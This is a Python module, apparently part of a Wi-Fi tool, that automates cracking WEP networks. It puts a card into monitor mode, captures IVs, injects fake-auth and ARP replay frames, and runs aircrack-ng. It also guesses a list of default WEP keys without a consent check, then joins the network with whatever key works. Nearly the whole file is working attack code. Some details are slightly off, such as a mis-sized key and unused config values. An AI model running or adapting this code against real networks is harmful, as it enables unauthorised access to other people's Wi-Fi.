"""WEP key recovery stage — IV capture and aircrack-ng.

WEP is fundamentally broken.  The RC4 key schedule leaks information through
weak initialisation vectors (IVs).  Given enough captured IVs the key can be
recovered deterministically (FMS / PTW attacks).

Flow
----
1. Put card into monitor mode on the target channel.
2. Start airodump-ng to capture IVs for the target BSSID.
3. In parallel, run aireplay-ng to inject ARP replays and accelerate
   IV generation (requires at least one associated client, or we fake-auth
   ourselves).
4. Once enough IVs are collected (or the timeout is reached) run aircrack-ng
   against the capture file.
5. If the key is recovered, restore managed mode and connect.

Requires:  aircrack-ng suite (aircrack-ng, airodump-ng, aireplay-ng)
           — ``sudo apt install aircrack-ng``

REQUIRES EXPLICIT USER CONSENT — this stage performs active frame injection
and cryptographic key recovery.
"""

import glob
import os
import re
import signal
import subprocess
import tempfile
import time

from logging_config import get_logger
from vasili import PipelineStage, StageResult

logger = get_logger(__name__)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _check_tool(name: str) -> bool:
    try:
        subprocess.run(['which', name], capture_output=True, check=True, timeout=5)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


def _card_set_monitor(interface: str, channel: int = None) -> bool:
    """Put interface into monitor mode, optionally locking to *channel*."""
    try:
        subprocess.run(
            ['ip', 'link', 'set', interface, 'down'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['iw', 'dev', interface, 'set', 'type', 'monitor'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['ip', 'link', 'set', interface, 'up'],
            check=True, capture_output=True, timeout=5,
        )
        if channel:
            subprocess.run(
                ['iw', 'dev', interface, 'set', 'channel', str(channel)],
                capture_output=True, timeout=5,
            )
        return True
    except subprocess.CalledProcessError as e:
        logger.error('Failed to set %s to monitor: %s', interface, e)
        return False


def _card_set_managed(interface: str) -> bool:
    """Restore managed mode."""
    try:
        subprocess.run(
            ['ip', 'link', 'set', interface, 'down'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['iw', 'dev', interface, 'set', 'type', 'managed'],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ['ip', 'link', 'set', interface, 'up'],
            check=True, capture_output=True, timeout=5,
        )
        return True
    except subprocess.CalledProcessError as e:
        logger.error('Failed to set %s to managed: %s', interface, e)
        return False


def _kill_proc(proc: subprocess.Popen):
    """Terminate a subprocess cleanly, escalate to kill after 3 s."""
    if proc.poll() is not None:
        return
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=2)


def _parse_aircrack_key(output: str) -> str | None:
    """Extract the ASCII or hex key from aircrack-ng output.

    aircrack-ng prints one of:
        KEY FOUND! [ AB:CD:EF:01:23 ]      (hex)
        KEY FOUND! [ AB:CD:EF:01:23 ] (ASCII: hello )   (ASCII if printable)
    """
    m = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', output)
    if not m:
        return None
    raw = m.group(1)

    # Check for ASCII annotation
    ascii_m = re.search(r'\(ASCII:\s*(.+?)\s*\)', output[m.start():])
    if ascii_m:
        return ascii_m.group(1)

    # Return the colon-separated hex as-is (nmcli accepts both forms)
    return raw.strip()


def _latest_cap_file(prefix: str, tmpdir: str) -> str | None:
    """Find the most recent .cap file written by airodump-ng.

    airodump appends ``-01.cap``, ``-02.cap``, etc. to the prefix.
    """
    pattern = os.path.join(tmpdir, f'{prefix}*.cap')
    files = sorted(glob.glob(pattern), key=os.path.getmtime, reverse=True)
    return files[0] if files else None


# ---------------------------------------------------------------------------
# WEP key brute-force helpers
# ---------------------------------------------------------------------------

# Commonly shipped default WEP keys found on consumer routers / hotspots.
COMMON_WEP_KEYS = [
    # 64-bit (5 ASCII chars / 10 hex digits)
    'admin', 'pass1', '12345', 'abcde', 'ABCDE', 'guest',
    'super', 'defau', 'wifi1', 'home1',
    '1234567890', 'AABBCCDDEE', '0123456789', 'abcdef1234',
    # 128-bit (13 ASCII chars / 26 hex digits)
    'administrator', 'passw0rdpassw', 'wirelesspassw',
    'ABCDEFABCDEFAB', '01234567890123456789012345',
    'abcdefabcdefab', '00000000000000000000000000',
    'FFFFFFFFFFFFFFFFFFFFFFFFFFFF'[:26],
]


# ---------------------------------------------------------------------------
# Stage
# ---------------------------------------------------------------------------

class WepCrackStage(PipelineStage):
    """Capture WEP IVs and recover the key with aircrack-ng.

    Only runs if:
    - Network encryption is WEP
    - No internet from saved/configured credentials
    - aircrack-ng suite is installed
    - User has granted consent
    """
    name = 'wep_crack'
    requires_consent = True

    def can_run(self, network, card, context):
        if context.get('has_internet', False):
            return False
        if network.encryption_type != 'WEP':
            return False
        if not _check_tool('aircrack-ng'):
            logger.debug('aircrack-ng not installed, skipping WEP crack stage')
            return False
        if not _check_tool('airodump-ng'):
            logger.debug('airodump-ng not installed, skipping WEP crack stage')
            return False
        return True

    def run(self, network, card, context):
        bssid = network.bssid
        channel = network.channel
        interface = card.interface

        logger.info('WEP crack starting for %s (%s) ch %d on %s',
                     network.ssid or bssid, bssid, channel, interface)

        with tempfile.TemporaryDirectory(prefix='vasili_wep_') as tmpdir:
            key = self._crack(interface, bssid, channel, tmpdir)
            if not key:
                return StageResult(
                    success=False, has_internet=False,
                    context_updates={'wep_cracked': False},
                    message='WEP key not recovered (insufficient IVs or timeout)',
                )

            logger.info('WEP key recovered for %s: %s',
                         network.ssid or bssid, key)

            # Restore managed mode and connect
            card.ensure_managed()
            time.sleep(1)

            if card.connect(network, password=key):
                import network_isolation
                has_internet = network_isolation.verify_connectivity(interface)
                return StageResult(
                    success=True, has_internet=has_internet,
                    context_updates={
                        'wep_cracked': True,
                        'wep_key': key,
                        'has_internet': has_internet,
                        'wifi_associated': True,
                        'connected_with': 'wep_crack',
                    },
                    message='WEP cracked and connected'
                            + (' — internet OK' if has_internet else ' — no internet'),
                )
            else:
                return StageResult(
                    success=False, has_internet=False,
                    context_updates={
                        'wep_cracked': True,
                        'wep_key': key,
                    },
                    message='WEP key found but connection failed',
                )

    # ------------------------------------------------------------------
    # Core crack orchestration
    # ------------------------------------------------------------------

    def _crack(self, interface: str, bssid: str, channel: int,
               tmpdir: str) -> str | None:
        """Full WEP crack: monitor → capture → inject → aircrack.

        Returns the recovered key string or None.
        """
        capture_prefix = 'wep_capture'

        if not _card_set_monitor(interface, channel):
            logger.error('Cannot enter monitor mode on %s', interface)
            return None

        airodump = None
        aireplay_fakeauth = None
        aireplay_replay = None

        try:
            # ----- airodump-ng: capture IVs -----
            airodump_cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', os.path.join(tmpdir, capture_prefix),
                '--output-format', 'cap',
                interface,
            ]
            logger.info('Starting IV capture: %s', ' '.join(airodump_cmd))
            airodump = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Give airodump a moment to initialise
            time.sleep(2)

            # ----- aireplay-ng: fake authentication (needed before replay) -----
            if _check_tool('aireplay-ng'):
                aireplay_fakeauth = subprocess.Popen(
                    [
                        'aireplay-ng',
                        '--fakeauth', '0',     # single fake-auth
                        '-a', bssid,           # target AP
                        '-T', '3',             # retry 3 times
                        interface,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                # Wait for fake-auth to finish (usually <5 s)
                try:
                    aireplay_fakeauth.wait(timeout=15)
                except subprocess.TimeoutExpired:
                    _kill_proc(aireplay_fakeauth)

                # ----- aireplay-ng: ARP replay injection -----
                aireplay_replay = subprocess.Popen(
                    [
                        'aireplay-ng',
                        '--arpreplay',         # ARP request replay
                        '-b', bssid,           # target AP
                        interface,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                logger.info('ARP replay injection running on %s', interface)

            # ----- Wait for IVs, periodically try aircrack-ng -----
            key = self._poll_aircrack(tmpdir, capture_prefix, bssid)
            return key

        finally:
            # Clean up all child processes
            for proc in (aireplay_replay, aireplay_fakeauth, airodump):
                if proc:
                    _kill_proc(proc)

            # Also kill any stray aireplay/airodump on this interface
            for tool in ('airodump-ng', 'aireplay-ng'):
                subprocess.run(
                    ['pkill', '-f', f'{tool}.*{interface}'],
                    capture_output=True, check=False,
                )

            _card_set_managed(interface)

    def _poll_aircrack(self, tmpdir: str, prefix: str,
                       bssid: str) -> str | None:
        """Periodically run aircrack-ng against the growing capture file.

        We attempt a crack every ``crack_interval`` seconds, up to
        ``capture_timeout`` total.  WEP with PTW usually needs ~20 000 IVs
        for a 64-bit key and ~40 000 for 128-bit.
        """
        capture_timeout = 120   # max seconds of capture
        crack_interval = 10     # try cracking every N seconds
        start = time.time()

        while time.time() - start < capture_timeout:
            time.sleep(crack_interval)

            cap_file = _latest_cap_file(prefix, tmpdir)
            if not cap_file:
                continue

            # Quick stat check — don't bother if the file is tiny
            try:
                if os.path.getsize(cap_file) < 5000:
                    logger.debug('Capture file too small (%d bytes), waiting...',
                                 os.path.getsize(cap_file))
                    continue
            except OSError:
                continue

            elapsed = int(time.time() - start)
            logger.info('Attempting aircrack-ng (%d s elapsed)...', elapsed)

            key = self._run_aircrack(cap_file, bssid)
            if key:
                return key

        # Final attempt
        cap_file = _latest_cap_file(prefix, tmpdir)
        if cap_file:
            return self._run_aircrack(cap_file, bssid)
        return None

    def _run_aircrack(self, cap_file: str, bssid: str) -> str | None:
        """Run aircrack-ng PTW attack on a capture file."""
        try:
            result = subprocess.run(
                [
                    'aircrack-ng',
                    '-a', '1',           # WEP mode
                    '-b', bssid,         # target BSSID
                    '-l', '/dev/stdout',  # write key to stdout
                    cap_file,
                ],
                capture_output=True, text=True, timeout=60,
            )
            key = _parse_aircrack_key(result.stdout)
            if key:
                return key
        except subprocess.TimeoutExpired:
            logger.debug('aircrack-ng attempt timed out')
        except Exception as e:
            logger.error('aircrack-ng error: %s', e)
        return None

    def get_config_schema(self):
        return {
            'capture_timeout': {
                'type': 'int', 'default': 120,
                'description': 'Max seconds to capture IVs before giving up',
            },
            'crack_interval': {
                'type': 'int', 'default': 10,
                'description': 'Seconds between aircrack-ng crack attempts',
            },
        }


class WepCommonKeysStage(PipelineStage):
    """Try a curated set of common default WEP keys.

    Runs before the heavy IV-capture crack.  Many consumer APs ship with
    trivially guessable factory WEP keys — this stage burns through them
    in seconds.
    """
    name = 'wep_common_keys'
    requires_consent = False

    def can_run(self, network, card, context):
        if context.get('has_internet', False):
            return False
        return network.encryption_type == 'WEP'

    def run(self, network, card, context):
        # Merge user-configured keys (from pipeline context) with built-in list
        user_keys = context.get('_wep_keys', [])
        all_keys = list(dict.fromkeys(user_keys + COMMON_WEP_KEYS))

        logger.info('Trying %d common/configured WEP keys for %s',
                     len(all_keys), network.ssid or network.bssid)

        for i, key in enumerate(all_keys):
            if context.get('wifi_associated'):
                card.disconnect()

            if card.connect(network, password=key):
                import network_isolation
                has_internet = network_isolation.verify_connectivity(card.interface)
                return StageResult(
                    success=True, has_internet=has_internet,
                    context_updates={
                        'wifi_associated': True,
                        'has_internet': has_internet,
                        'connected_with': 'wep_common_key',
                        'wep_key': key,
                        'key_index': i,
                    },
                    message=f'WEP key #{i+1} worked'
                            + (' — internet OK' if has_internet else ' — no internet'),
                )
            else:
                card.disconnect()

        return StageResult(
            success=False, has_internet=False,
            context_updates={'wep_common_keys_failed': True},
            message=f'All {len(all_keys)} common WEP keys failed',
        )

    def get_config_schema(self):
        return {
            'extra_keys': {
                'type': 'list', 'default': [],
                'description': 'Additional WEP keys to try (hex or ASCII)',
            },
        }
